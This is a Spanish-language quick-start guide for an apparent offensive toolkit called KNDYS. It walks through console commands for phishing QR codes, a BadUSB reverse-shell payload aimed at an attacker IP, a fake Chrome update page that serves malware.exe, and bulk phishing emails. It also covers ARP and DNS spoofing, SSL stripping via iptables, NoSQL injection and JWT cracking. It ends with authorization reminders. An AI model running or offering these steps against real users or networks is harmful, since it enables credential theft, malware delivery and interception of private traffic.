# KNDYS v3.1 - Quick Start Examples

Ejemplos rápidos de uso de los nuevos módulos para empezar inmediatamente.

---

## Social Engineering - Ejemplos

### 1. Generar Código QR de Phishing
```bash
python3 tt
> use social/qr_generator
> set url http://phishing-test.local/login
> set output wifi_qr.png
> set size 500
> run
```
**Resultado**: Código QR generado que redirige a página de phishing

---

### 2. Crear Payload USB BadUSB
```bash
python3 tt
> use social/usb_payload
> set payload_type reverse_shell
> set target_os windows
> set lhost 192.168.1.100
> set lport 4444
> run
```
**Resultado**: Script Rubber Ducky para reverse shell Windows

---

### 3. Generar Escenario de Pretexting
```bash
python3 tt
> use social/pretexting
> set scenario it_support
> set company "Acme Corp"
> set urgency high
> run
```
**Resultado**: Script completo de ingeniería social para IT Support

---

### 4. Crear Página de Actualización Falsa
```bash
python3 tt
> use social/fake_update
> set software chrome
> set payload malware.exe
> set port 8080
> run

# Luego deploy:
cd fake_update_chrome
python3 -m http.server 8080
```
**Resultado**: Página HTML profesional de "actualización de Chrome"

---

### 5. Preparar Campaña de Email Masivo
```bash
# Crear archivo targets.csv:
# email@example.com,John Doe,Acme Corp

python3 tt
> use social/mass_mailer
> set template invoice
> set targets targets.csv
> set smtp_server smtp.gmail.com
> set delay 10
> run
```
**Resultado**: Templates de email profesionales listos para envío

---

## Network Attacks - Ejemplos

### 6. ARP Spoofing / MITM
```bash
# Primero habilitar IP forwarding:
sudo sysctl -w net.ipv4.ip_forward=1

python3 tt
> use network/arp_spoof
> set target_ip 192.168.1.50
> set gateway_ip 192.168.1.1
> set interface eth0
> run
```
**Resultado**: Implementación Scapy para MITM

---

### 7. Captura de Paquetes con Filtros
```bash
python3 tt
> use network/packet_sniffer
> set interface eth0
> set filter "tcp port 80 or tcp port 443"
> set output capture.pcap
> set count 1000
> run

# Analizar con Wireshark:
wireshark capture.pcap
```
**Resultado**: Captura de tráfico HTTP/HTTPS

---

### 8. DNS Spoofing
```bash
# Requiere ARP spoofing activo primero

python3 tt
> use network/dns_spoof
> set domain login.company.com
> set fake_ip 192.168.1.100
> set interface eth0
> run
```
**Resultado**: Redirección DNS a servidor malicioso

---

### 9. SSL Stripping
```bash
# Setup completo:
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

python3 tt
> use network/ssl_strip
> set interface eth0
> set port 8080
> run
```
**Resultado**: Downgrade HTTPS a HTTP para intercepción

---

## Web Application - Ejemplos

### 10. Escanear Configuración CORS
```bash
python3 tt
> use webapp/cors_scanner
> set url https://api.example.com
> set origin https://evil.com
> run
```
**Resultado**: Detección de wildcard CORS o origin reflection

---

### 11. Test de Seguridad JWT
```bash
python3 tt
> use webapp/jwt_cracker
> set token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
> set algorithm HS256
> run
```
**Resultado**: Decodificación JWT + técnicas de ataque

---

### 12. Introspección GraphQL
```bash
python3 tt
> use webapp/graphql_introspection
> set url https://api.example.com/graphql
> set output schema.json
> run

# Ver schema extraído:
cat schema.json
```
**Resultado**: Schema GraphQL completo en JSON

---

### 13. Testing de Inyección NoSQL
```bash
python3 tt
> use webapp/nosql_injection
> set url http://api.example.com/login
> set parameter username
> set technique auth_bypass
> run
```
**Resultado**: Payloads NoSQL para MongoDB/CouchDB

---

### 14. Fuzzing de API REST
```bash
python3 tt
> use webapp/api_fuzzer
> set url https://api.example.com
> set method POST
> set endpoints endpoints.txt
> run
```
**Resultado**: Endpoints comunes + técnicas de fuzzing

---

## Escenarios Completos

### Scenario A: Phishing Campaign Corporativo

**Objetivo**: Evaluar conciencia de empleados

```bash
# 1. Generar QR para cafetería
use social/qr_generator
set url http://internal-login.phishing.test
run

# 2. Crear página de login falsa
use social/website_cloner
set url https://intranet.company.com/login
run

# 3. Preparar email campaign
use social/mass_mailer
set template password_reset
set targets employees.csv
run
```

---

### Scenario B: Network Security Assessment

**Objetivo**: Evaluar seguridad de red interna

```bash
# 1. Habilitar IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. ARP spoofing
use network/arp_spoof
set target_ip 192.168.1.50
set gateway_ip 192.168.1.1
run

# 3. Capturar tráfico (en otro terminal)
use network/packet_sniffer
set filter "tcp port 80"
run

# 4. SSL stripping (en otro terminal)
use network/ssl_strip
set interface eth0
run
```

---

### Scenario C: API Security Testing

**Objetivo**: Pentesting de API moderna

```bash
# 1. Introspección GraphQL
use webapp/graphql_introspection
set url https://api.target.com/graphql
run

# 2. Test CORS
use webapp/cors_scanner
set url https://api.target.com
set origin https://evil.com
run

# 3. Test JWT (capturar token primero)
use webapp/jwt_cracker
set token <captured_token>
run

# 4. NoSQL injection
use webapp/nosql_injection
set url https://api.target.com/login
run

# 5. API fuzzing
use webapp/api_fuzzer
set url https://api.target.com
run
```

---

## Tips Rápidos

### Ver Todos los Módulos
```bash
show modules # Todos
show modules social # Solo social engineering
show modules network # Solo network attacks
show modules webapp # Solo web application
```

### Ayuda de Módulo Específico
```bash
use social/mass_mailer
options # Ver todas las opciones
info # Ver información detallada
```

### Configuración Global
```bash
setg lhost 192.168.1.100 # IP del atacante
setg lport 4444 # Puerto listener
```

### Wordlists Disponibles
```bash
show wordlists # Ver diccionarios
download wordlist 1 # Descargar rockyou.txt
```

---

## Setup Rápido de Herramientas

### Para Network Attacks
```bash
# IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# iptables para SSL strip
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Instalar scapy
pip install scapy
```

### Para QR Generator
```bash
pip install qrcode[pil]
```

### Para Web Testing
```bash
# Ya incluido en requirements.txt
pip install requests
```

---

## Recordatorios Legales

Antes de usar cualquier módulo:

1. Obtener **autorización por escrito**
2. Definir **scope claramente**
3. Usar solo en **entornos controlados**
4. Documentar **todas las acciones**
5. Eliminar **artefactos post-testing**

**Módulos que requieren especial autorización**:
- sms_spoofing (ilegal en muchas jurisdicciones)
- dhcp_starvation (ataque DoS)
- arp_spoof (interceptación de red)
- ssl_strip (interceptación de comunicaciones)

---

## Documentación Completa

Para información detallada, consultar:

- **README_v3.1.md** - Guía de inicio v3.1
- **MODULES_GUIDE_v3.1.md** - Documentación completa de módulos
- **DOCUMENTATION_INDEX.md** - Índice de toda la documentación
- **IMPLEMENTATION_SUMMARY_v3.1.md** - Detalles técnicos

---

## Recursos de Aprendizaje

### Documentación Oficial
- OWASP Testing Guide
- PTES Standard
- Red Team Field Manual

### Herramientas Relacionadas
- Social Engineering Toolkit (SET)
- Metasploit Framework
- Bettercap
- Burp Suite

### Comunidad
- r/netsec
- OWASP Community
- HackerOne
- Bugcrowd

---

## Siguiente Paso

```bash
# Empezar ahora:
python3 tt
> help
> show modules social
> use social/qr_generator
> run
```

---

**KNDYS Framework v3.1** 
*54+ Modules | 10 Categories | Ready for Production*

*Use Responsibly - Always Get Authorization* 
